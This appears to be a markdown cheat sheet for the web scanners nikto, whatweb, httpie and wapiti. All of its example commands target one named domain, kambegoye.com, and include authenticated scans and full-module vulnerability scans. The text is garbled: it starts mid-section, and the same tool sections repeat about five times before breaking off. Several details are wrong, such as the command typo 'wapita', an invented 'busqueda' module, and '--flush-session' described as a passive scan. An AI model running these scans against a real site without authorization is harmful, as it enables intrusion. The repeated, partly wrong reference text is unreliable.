nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
